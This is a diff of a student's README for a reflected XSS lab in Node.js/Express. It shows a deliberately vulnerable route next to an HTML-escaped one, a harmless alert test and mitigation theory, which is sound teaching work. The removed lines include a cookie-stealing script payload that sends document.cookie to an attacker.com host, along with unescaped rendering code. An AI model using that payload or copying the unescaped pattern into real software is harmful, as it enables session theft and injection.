@@ -1,68 +1,120 @@
-# Cross-Site Scripting (Reflected XSS)
+# Basic Reflected XSS Lab — Cyber Security Assignment
 
-**Student Name:** Ashish Bairwa  
-**Roll Number:** IIT2024261  
-**Category:** Cross-Site Scripting (XSS)  
-**Variant Implemented:** Variant 2: Reflected XSS  
+- **Student:** Ashish (IIT2024261, Group 10)
+- **Topic:** Web Server Security — Exploitation and Mitigation of Reflected XSS
+- **Technology:** Node.js, Express.js, HTML, CSS
 
 ---
 
-## Overview
-This module demonstrates Reflected Cross-Site Scripting (XSS) where unvalidated user input provided in an HTTP query parameter (e.g. search or filter) is immediately reflected back in the server's HTML response without context-aware output encoding.
+## 1. Project Overview
 
-### (a) Vulnerable Implementation
-The server renders user input directly into HTML without escaping:
-```javascript
-// Vulnerable search route:
-app.get('/search', (req, res) => {
-  const query = req.query.q || '';
-  // Directly embedding user input into response HTML:
-  res.send(`
-    <h1>Search Results</h1>
-    <p>You searched for: ${query}</p>
-  `);
-});
+This project is a minimal, beginner-friendly web application designed to demonstrate:
+1. **Vulnerable Route (`/vulnerable`)**: Receives user input from a form or URL query string and reflects it directly into the HTML response without escaping. An injected `<script>` tag executes in the browser.
+2. **Secured Route (`/secure`)**: Receives the exact same input, but sanitizes it using HTML entity encoding before rendering. The payload is displayed as safe text and does not execute.
+
+---
+
+## 2. Project Files
+
+```text
+cs assignmet 4/
+├── package.json          # Dependencies & npm scripts
+├── server.js             # Backend Express server (pure routing & escaping logic)
+├── public/               # Frontend static assets
+│   ├── style.css         # Clean, modern CSS stylesheet
+│   └── script.js         # Client-side helper scripts
+├── views/                # Frontend HTML templates
+│   ├── index.html        # Home / portal page
+│   ├── vulnerable.html   # Vulnerable route template
+│   └── secure.html       # Secured route template
+├── README.md             # Documentation & lab explanations
+└── .gitignore            # Excludes node_modules
 ```
 
-### (b) Working Exploit
-* **Crafted Malicious URL:**
-  ```text
-  http://localhost:3000/search?q=<script>alert(document.cookie)</script>
-  ```
-  *(or stealing session cookie: `<script>fetch('http://attacker.com/log?c='+document.cookie)</script>`)*
-* **Execution:**
-  When a victim clicks this link, the server reflects the payload into the DOM, and the victim's browser executes the attacker's JavaScript within the application's origin context.
+---
 
-### (c) Root Cause
-The web application includes untrusted user input directly in its rendered HTML output without performing context-aware output encoding or sanitization, causing the browser to interpret data as executable code.
+## 3. How to Install and Run
 
-### (d) Implemented Mitigation
-**Context-Aware HTML Entity Encoding:**
-```javascript
-// Secure implementation:
-function escapeHTML(str) {
-  return str.replace(/[&<>'"]/g, tag => ({
-    '&': '&amp;',
-    '<': '&lt;',
-    '>': '&gt;',
-    "'": '&#39;',
-    '"': '&quot;'
-  }[tag] || tag));
-}
-
-app.get('/search', (req, res) => {
-  const query = escapeHTML(req.query.q || '');
-  res.send(`
-    <h1>Search Results</h1>
-    <p>You searched for: ${query}</p>
-  `);
-});
+### Step 1: Install Dependencies
+Open your terminal in this folder and run:
+```bash
+npm install
 ```
-When `<script>` is injected, it renders safely as literal text `&lt;script&gt;` on screen; the browser does not execute it.
+*(On Windows PowerShell, if scripts are restricted, run: `npm.cmd install`)*
 
-### (e) Other Mitigations (Theory)
-1. **Framework Auto-Escaping:** Utilizing modern template engines (e.g., EJS, Pug, React, Angular) that automatically apply context-aware HTML escaping by default.
-2. **HTML Sanitizers for Rich Content:** Using trusted sanitization libraries (e.g., DOMPurify) when user-supplied HTML is intentionally permitted.
-3. **Content Security Policy (CSP):** Setting HTTP header `Content-Security-Policy: default-src 'self'` to prohibit execution of inline scripts and disallow loading scripts from unapproved domains.
-4. **HttpOnly Cookie Flag:** Marking sensitive authentication cookies with `HttpOnly` so client-side JavaScript cannot access them via `document.cookie`.
-5. **Safe DOM Sinks:** Avoiding dangerous JavaScript sinks such as `innerHTML`, `document.write()`, and `eval()`, opting instead for safe APIs like `textContent` and `createElement()`.
+### Step 2: Start the Server
+```bash
+npm start
+```
+*(Or run `node server.js`)*
+
+### Step 3: Open in Browser
+- **Home:** [http://localhost:3000/](http://localhost:3000/)
+- **Vulnerable Page:** [http://localhost:3000/vulnerable](http://localhost:3000/vulnerable)
+- **Secured Page:** [http://localhost:3000/secure](http://localhost:3000/secure)
+
+---
+
+## 4. How to Test
+
+### Test Payload (Harmless PoC):
+```html
+<script>alert('XSS')</script>
+```
+
+### Steps:
+1. Go to `http://localhost:3000/vulnerable`.
+2. Enter `<script>alert('XSS')</script>` in the input box and click **Submit**.
+   - **Result:** An alert box showing `XSS` immediately pops up. The script executed.
+3. Now go to `http://localhost:3000/secure`.
+4. Enter the exact same payload `<script>alert('XSS')</script>` and click **Submit**.
+   - **Result:** No alert box appears. The text `<script>alert('XSS')</script>` is displayed safely as harmless plain text on the page.
+
+---
+
+## 5. Explanation of Vulnerability & Root Cause
+
+### What is Reflected XSS?
+Reflected Cross-Site Scripting (XSS) occurs when an application receives data from an HTTP request (such as a form submission or URL parameter `?name=...`) and immediately includes that data in the HTTP response HTML without sanitizing it.
+
+### Root Cause in `server.js`
+In the vulnerable route:
+```javascript
+
+const resultHtml = name ? `<p style="font-size: 18px;">Hello, <strong>${name}</strong>!</p>` : '';
+```
+The variable `name` is inserted raw into the HTML string. When the browser receives the HTML from the server, its HTML parser sees `<script>` and assumes it is legitimate code meant to be run, executing the JavaScript.
+
+### How the Mitigation Works in `server.js`
+In the secured route:
+```javascript
+
+const resultHtml = name ? `<p style="font-size: 18px;">Hello, <strong>${escapeHtml(name)}</strong>!</p>` : '';
+```
+Before inserting `name`, we pass it through `escapeHtml()`:
+- `<` becomes `&lt;`
+- `>` becomes `&gt;`
+- `&` becomes `&amp;`
+- `"` becomes `&quot;`
+- `'` becomes `&#39;`
+
+When the browser parses `&lt;script&gt;`, it does not recognize an opening `<` bracket. It treats the characters as plain text and displays them on screen without executing any code.
+
+---
+
+## 6. Alternative Mitigations (Theory)
+
+1. **Framework Auto-Escaping:**
+   Modern frontend frameworks (like React, Angular, or Vue) automatically escape variables rendered inside templates (e.g., `{userName}` in React). They treat data as text nodes unless a developer explicitly uses an unsafe method like `dangerouslySetInnerHTML`.
+
+2. **HTML Sanitisation:**
+   If an application intentionally needs to allow user-submitted HTML (like a rich text blog post with `<b>` or `<i>`), simple escaping cannot be used because it would break formatting. Instead, an HTML sanitizer library (such as DOMPurify) is used to parse the HTML, keep safe tags, and strip out dangerous tags like `<script>` or event handlers like `onload` and `onerror`.
+
+3. **Content Security Policy (CSP):**
+   CSP is an HTTP response header (e.g., `Content-Security-Policy: default-src 'self'`) that tells the browser which script sources are allowed. A strong CSP disables inline scripts and prevents untrusted scripts from running even if an injection flaw exists. It serves as defense-in-depth.
+
+4. **HttpOnly Cookies:**
+   A cookie flag (`Set-Cookie: session=abc; HttpOnly`) that blocks JavaScript from accessing `document.cookie`. This prevents attackers from stealing session cookies via XSS. Note: HttpOnly does *not* prevent XSS itself; an attacker can still execute actions on the user's behalf.
+
+5. **Safe DOM Sinks:**
+   When manipulating the DOM with client-side JavaScript, developers should use safe properties like `element.textContent` rather than `element.innerHTML`. `textContent` assigns data directly as text without invoking the browser's HTML parser.
